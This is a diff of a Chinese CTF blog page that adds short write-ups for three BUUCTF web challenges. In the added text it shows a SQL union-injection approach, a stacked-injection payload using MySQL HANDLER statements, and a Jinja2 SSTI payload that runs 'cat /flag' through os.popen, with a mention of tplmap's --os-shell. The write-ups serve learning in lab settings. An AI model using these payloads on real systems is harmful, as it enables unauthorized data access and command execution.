@@ -358,21 +358,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:
-                    2021-02-28
+                    2021-03-02
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:
-                    1.6k
+                    2.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:
-                    7 分
+                    9 分
                 </div>
                 
 
@@ -627,6 +627,45 @@ flag <span class="token operator">=</span> <span class="token string">''</span>
 <p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210228182552765.png"></p>
 <p>再上传个图片马连上去就OK</p>
 <p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210228183159775.png"></p>
+<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><blockquote>
+<p>在查询的数据不存在的情况下，联合查询会构造一个虚拟的数据</p>
+</blockquote>
+<p>在输错的源码页面有提示</p>
+<p><code>&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</code></p>
+<p>base32decode:<code>c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==</code></p>
+<p>base64decode:<code>select * from user where username = &#39;$name&#39;</code></p>
+<p>可以判断注入点在name这里，一共三个字段，通过判断可以得知name的所在的字段为<strong>2</strong>，但一般的字符会提示用户名错误，只有为admin的时候才有sql语句报错。passwd的字段应该就是<strong>3</strong>了，But,当字段3中提交的pw和表单中提交的pw一样的情况下还是会报错，试了一下把前面的pw进行MD5加密就可以了，应该是在导入数据库的时候把密码进行了MD5加密。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210301154418343.png"></p>
+<h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>和那个强网杯的堆叠注入好像差不多</p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210301162058010.png"></p>
+<p>但是一些关键字被过滤了</p>
+<p>查了一下，发现mysql有个语句没被过滤的可以查看<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/handler.html">官方文档</a></p>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">HANDLER tbl_name OPEN [ [AS] alias]
+
+HANDLER tbl_name READ index_name &#123; &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; &#125; (value1,value2,...)
+    [ WHERE where_condition ] [LIMIT ... ]
+HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;
+    [ WHERE where_condition ] [LIMIT ... ]
+HANDLER tbl_name READ &#123; FIRST | NEXT &#125;
+    [ WHERE where_condition ] [LIMIT ... ]
+
+HANDLER tbl_name CLOSE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<blockquote>
+<p>该<code>HANDLER</code>语句提供对表存储引擎接口的直接访问。适用于 <code>InnoDB</code>和<code>MyISAM</code>表格。</p>
+<p>该<code>HANDLER ... OPEN</code>语句将打开一个表，使其可以使用后续<code>HANDLER ... READ</code>语句进行访问。该表对象未被其他会话共享，并且在会话调用<code>HANDLER ... CLOSE</code>或会话终止之前不会关闭 。</p>
+<p>如果使用别名打开表，则其他<code>HANDLER</code>语句对打开的表的进一步引用必须使用别名而不是表名。如果不使用别名，而是使用数据库名称限定的表名称打开表，则其他引用必须使用非限定的表名称。例如，对于使用打开的表 <code>mydb.mytable</code>，必须使用进一步的引用 <code>mytable</code>。</p>
+</blockquote>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">#payload
+
+1&#39;;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h2><p>存在XSS</p>
+<p>根据提示发现存在ssti漏洞</p>
+<p>payload:</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> c<span class="token punctuation">.</span>__name__<span class="token operator">==</span><span class="token string">'catch_warnings'</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> c<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"__import__('os').popen('cat /flag').read()"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>使用tplmap启动伪终端使用<code>--os-shell</code>直接查看flag</p>
 
                 
             </div>
@@ -735,17 +774,16 @@ flag <span class="token operator">=</span> <span class="token string">''</span>
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2021/web/buuctf/">
+                <a href="/2021/lou-dong/ssti-mo-ban-zhu-ru/">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210224152322090.png" class="responsive-img" alt="BUU做题记录">
+                        <img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210302221112050.png" class="responsive-img" alt="SSTI模板注入">
                         
-                        <span class="card-title">BUU做题记录</span>
+                        <span class="card-title">SSTI模板注入</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -755,22 +793,21 @@ flag <span class="token operator">=</span> <span class="token string">''</span>
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-02-22
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-03-01
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/CTF/" class="post-category">
-                                    CTF
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E/" class="post-category">
+                                    漏洞
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
@@ -1009,7 +1046,7 @@ flag <span class="token operator">=</span> <span class="token string">''</span>
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">37.2k</span>&nbsp;字
+                class="white-color">40.2k</span>&nbsp;字
             
             
             
